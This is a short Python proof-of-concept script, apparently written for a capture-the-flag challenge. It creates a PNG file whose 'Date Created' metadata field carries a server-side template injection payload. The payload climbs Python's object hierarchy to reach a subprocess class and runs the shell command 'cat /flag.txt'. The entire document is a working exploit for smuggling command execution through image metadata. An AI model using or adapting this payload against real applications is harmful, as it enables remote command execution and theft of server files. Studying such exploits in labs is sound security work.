from PIL import Image, PngImagePlugin

img = Image.new("RGB", (1, 1), (255, 255, 255))
pi = PngImagePlugin.PngInfo()
payload = "{{ (''.__class__.__mro__[1].__subclasses__()[256]('cat /flag.txt', shell=True, stdout=-1).stdout.read()) }}"
pi.add_text("Date Created", "2025:10:28 02:17:17 " + payload)
img.save("poc.png", "PNG", pnginfo=pi)
print("poc.png created")
